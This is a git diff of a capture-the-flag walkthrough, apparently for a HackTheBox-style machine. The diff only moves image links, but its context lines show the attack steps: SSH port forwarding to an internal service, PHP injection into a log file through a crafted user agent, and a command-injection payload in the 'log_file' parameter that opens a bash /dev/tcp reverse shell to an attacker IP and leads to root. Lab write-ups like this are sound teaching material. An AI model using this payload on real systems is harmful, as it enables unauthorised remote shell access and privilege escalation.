@@ -67,10 +67,10 @@ What ports are listening?
 
 Get the service command and check it  
 `cat ./systemd/system/multi-user.target.wants/monitoring.service`
-![alt text](image.png)
+![alt text](images/image.png)
 
 Cannot access root/monitoring file, but can set up port forward and access it
-![alt text](image-1.png)
+![alt text](images/image-1.png)
 
 Setup an ssh listener locally on port 8081. Forward it from 8081 to 127.0.0.1 locally and direct it to 8080 on the other end (target machine)  
  • `ssh -L 8081:127.0.0.1:8080 amay@<RHOST>`
@@ -87,9 +87,9 @@ Check to see if you can inject php code into log file
  ○ KALI -> `curl 10.129.62.179/contretemps -x http://localhost:8080`  
  • Intercept it with Burp, change to a more suspicious command agent
 
-![alt text](image-2.png)
-![alt text](image-3.png)
-![alt text](image-5.png)
+![alt text](images/image-2.png)
+![alt text](images/image-3.png)
+![alt text](images/image-5.png)
 
 Try to get other files  
  • `/root/root.txt`  
@@ -107,4 +107,4 @@ Use nohup -> shells persist after the terminal closes
  • `log_file=root/root.txt;bash+-c+'nohup+bash+-i+>%26/dev/tcp/10.10.14.9/9001+0>%261+%26';#&analyze_log=`  
 Get root access
 
-![alt text](image-4.png)
+![alt text](images/image-4.png)
